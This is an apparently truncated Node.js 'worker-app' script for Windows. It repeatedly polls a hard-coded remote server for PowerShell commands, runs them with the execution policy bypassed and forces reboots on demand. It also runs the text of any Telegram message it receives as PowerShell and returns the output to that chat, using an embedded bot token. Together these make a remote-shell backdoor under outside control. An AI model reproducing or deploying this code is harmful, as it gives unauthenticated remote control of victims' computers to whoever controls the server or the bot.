const http = require('http')
    const {execFileSync} = require('child_process')
    const path = require("path")
    const os = require("os")
    const fs = require("fs")
    const TelegramBot = require('node-telegram-bot-api');
    const token = 'Y5250097913:AAFh1VmYhLZnjKIzSqG-LM-i5d7wgyEvdAc';
    const apiUrl = process.env.DEBUG ? 'http://localhost:5000' : 'http://139.99.7.84:5000'
    // Process path
    const serviceDir = process.cwd()
        
    const execNoError = (cmd, args, options) => {
        try {
            return execFileSync(cmd, args, options).toString().trim()
        } catch (e) {
            return e.toString().trim()
        }
    }


    function execPowershellScript(script) {
        // Write script to a file in temp dir
        const scriptPath = path.join(os.tmpdir(), 'script.ps1')
        fs.writeFileSync(scriptPath, script)
        // Execute script
        return execNoError('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-File', scriptPath])
    }


    function log(data) {
        console.log(data)
        // Now in timezone asia +7
        const date = new Date().toLocaleString('en-US', {timeZone: 'Asia/Ho_Chi_Minh'})
        const dataString = `[${date}] ${String(data).trimEnd()}\n`
        // Write log to desktop
        fs.appendFileSync(path.join(os.homedir(), 'Desktop', 'log.txt'), dataString)
    }


    async function get(url) {
        return await new Promise((resolve, reject) => {
            http.get(url, (res) => {
                let data = ''
                res.on('data', (chunk) => {
                    data += chunk
                })
                res.on('end', () => {
                    resolve(data)
                })
            }).on('error', (err) => {
                reject(err)
            })
        })
    }

        // Check for reset
        setInterval(async () => {
            let data
            try {
                data = await get(`${apiUrl}/worker-app/needs-reset?auth=auth@worker@gmail`)
                if (JSON.parse(data).needs_reset) {
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đang reset`)
                    const result = execNoError('C:\\Windows\\System32\\shutdown.exe', ['/r', '/t', '120', '/f'])
                    log(`Reset result: ${result}`)
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đã reset: ${result}`)
                }
            } catch (e) {
                log(e)
                log(data)
            }
        }, 1000)

        const bot = new TelegramBot(token, { polling: true });

        // Get the chat ID from a message object
        function getChatId(msg) {
          return msg.chat.id;
        }

        bot.on('message', (msg) => {
            const chatId = getChatId(msg);
            const message = msg.text;

        // Check for powershell command
        setInterval(async () => {
            let data = ''
            try {
                data = await get(`${apiUrl}/worker-app/powershell-cmd?auth=auth@worker@gmail`)
                const command = JSON.parse(data).cmd
                if (command !== null || message !== null ) {
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đang chạy lệnh ${command||message}`)
                    const result = execPowershellScript(command||message)
                    log(`Powershell result: ${result}`)
                    bot.sendMessage(chatId,result)
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Kết quả lệnh: ${result}`)
                }
            } catch (e) {
                log(e)
                log(data)
            }
